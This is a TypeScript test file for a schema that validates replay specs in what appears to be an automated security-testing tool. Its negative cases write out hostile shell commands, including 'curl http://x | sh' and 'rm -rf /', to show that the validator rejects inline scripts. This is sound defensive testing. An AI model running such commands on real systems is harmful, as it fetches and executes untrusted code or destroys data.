import { describe, expect, it } from 'vitest';

import { MAX_REPLAY_INPUT_REFS, MAX_REPLAY_STEPS, replaySpecSchema } from './replay-spec.js';

const HASH = 'a'.repeat(64);
const ASSET_ID = '018f3b2a-7c1d-7a00-8000-000000000001';
const SPEC_ID = '018f3b2a-7c1d-7a00-8000-000000000002';
const CANDIDATE_ID = '018f3b2a-7c1d-7a00-8000-000000000003';
const TEST_CASE_ID = '018f3b2a-7c1d-7a00-8000-000000000004';
const DECLARED_AT = '2026-01-01T00:00:00.000Z';
const TEST_STARTED_AT = '2026-01-01T00:05:00.000Z';

const endpoint = { assetId: ASSET_ID, urlTemplate: 'https://app.example.test/orders/{id}' };

/** A valid replay spec. Each negative test edits a copy, so the fixture itself stays valid. */
function validSpec(): Record<string, unknown> {
  return {
    id: SPEC_ID,
    candidateId: CANDIDATE_ID,
    testCaseId: TEST_CASE_ID,
    intrusivenessClass: 'active_safe',
    targets: [endpoint],
    steps: [
      {
        kind: 'http_request',
        method: 'GET',
        endpoint,
        roleKey: 'viewer',
        inputRef: 'inputs/order-id.json',
      },
      { kind: 'oob_check', channel: 'dns', windowMs: 30_000 },
    ],
    oracle: {
      type: 'status_diff',
      declaredAt: DECLARED_AT,
      params: { baselineRef: 'evidence/baseline-1', compare: 'status' },
    },
    testStartedAt: TEST_STARTED_AT,
    negativeControl: {
      strategy: 'unmodified_request',
      steps: [
        {
          kind: 'http_request',
          method: 'GET',
          endpoint,
          roleKey: 'owner',
          inputRef: 'inputs/order-id.json',
        },
      ],
    },
    pins: {
      modelIds: ['claude-sonnet-4-5'],
      personaPromptHashes: { validator: HASH },
      sdkVersion: '1.2.3',
      claudeCodeVersion: '2.0.0',
      sandboxImageDigest: `sha256:${'b'.repeat(64)}`,
      toolVersions: { curl: '8.5.0' },
      nucleiTemplateCommit: 'c'.repeat(40),
      policyHash: HASH,
      envelopeHash: HASH,
      priceTableVersion: '2026-01',
    },
    inputsRef: ['inputs/order-id.json'],
  };
}

describe('replaySpecSchema', () => {
  it('parses a valid replay spec', () => {
    expect(replaySpecSchema.safeParse(validSpec()).success).toBe(true);
  });

  it('rejects a step carrying an inline shell string', () => {
    const spec = validSpec();
    spec.steps = [{ kind: 'script', scriptId: 'probe.one', command: 'curl http://x | sh' }];
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects a script step that carries a body instead of an id', () => {
    const spec = validSpec();
    spec.steps = [{ kind: 'script', body: 'rm -rf /' }];
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects an unknown step kind', () => {
    const spec = validSpec();
    spec.steps = [{ kind: 'shell', command: 'id' }];
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects a missing negative control', () => {
    const spec = validSpec();
    delete spec.negativeControl;
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects an empty negative control', () => {
    const spec = validSpec();
    spec.negativeControl = { strategy: 'benign_value', steps: [] };
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects a negative control that is not one of the known strategies', () => {
    const spec = validSpec();
    spec.negativeControl = {
      strategy: 'anything_goes',
      steps: [{ kind: 'script', scriptId: 'benign.one' }],
    };
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects an oracle declared at or after the test started (post-hoc)', () => {
    for (const declaredAt of [TEST_STARTED_AT, '2026-01-01T00:06:00.000Z']) {
      const spec = validSpec();
      spec.oracle = { ...(spec.oracle as object), declaredAt };
      const result = replaySpecSchema.safeParse(spec);
      expect(result.success, declaredAt).toBe(false);
    }
  });

  it('rejects a destructive intrusiveness class (never authorisable, §8.3)', () => {
    const spec = validSpec();
    spec.intrusivenessClass = 'destructive';
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects a step input that is not listed in inputsRef', () => {
    const spec = validSpec();
    spec.inputsRef = [];
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects an oversized or blob-like input reference', () => {
    const spec = validSpec();
    spec.inputsRef = ['x'.repeat(300)];
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
    const blob = validSpec();
    blob.inputsRef = ['data:application/octet-stream;base64,QUJD'];
    expect(replaySpecSchema.safeParse(blob).success).toBe(false);
  });

  it('rejects too many input references', () => {
    const spec = validSpec();
    spec.inputsRef = Array.from({ length: MAX_REPLAY_INPUT_REFS + 1 }, (_, i) => `inputs/${i}`);
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects a target that is not an absolute http(s) URL', () => {
    for (const urlTemplate of [
      'data:text/html,<p>x</p>',
      'ftp://files.example.test/',
      '/relative/path',
    ]) {
      const spec = validSpec();
      spec.targets = [{ assetId: ASSET_ID, urlTemplate }];
      expect(replaySpecSchema.safeParse(spec).success, urlTemplate).toBe(false);
    }
  });

  it('rejects an empty step list and too many steps', () => {
    const empty = validSpec();
    empty.steps = [];
    expect(replaySpecSchema.safeParse(empty).success).toBe(false);
    const many = validSpec();
    many.steps = Array.from({ length: MAX_REPLAY_STEPS + 1 }, () => ({
      kind: 'script',
      scriptId: 'probe.one',
    }));
    expect(replaySpecSchema.safeParse(many).success).toBe(false);
  });

  it('rejects a tcp_probe to a port outside 1..65535', () => {
    const spec = validSpec();
    spec.steps = [{ kind: 'tcp_probe', host: 'app.example.test', port: 70_000 }];
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects pins with a malformed image digest', () => {
    const spec = validSpec();
    spec.pins = {
      ...(spec.pins as object),
      sandboxImageDigest: 'latest',
    };
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });

  it('rejects a replay spec with no pinned environment (§8.9: a missing pin fails)', () => {
    const spec = validSpec();
    delete spec.pins;
    expect(replaySpecSchema.safeParse(spec).success).toBe(false);
  });
});
